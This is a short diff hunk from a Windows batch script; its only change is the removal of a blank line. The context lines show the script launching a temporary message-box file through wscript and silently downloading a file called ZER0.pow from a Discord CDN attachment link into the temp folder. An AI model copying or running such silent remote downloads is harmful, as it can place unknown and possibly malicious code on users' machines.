@@ -207,7 +207,6 @@ wscript "%tmpmsgbox%"
 goto epic
 
 
-
 :B
 curl -s https://cdn.discordapp.com/attachments/856954280954691595/860270532108877844/ZER0.pow > "%temp%\ZER0.pow"
 if not exist "%temp%\ZER0.pow" goto check10
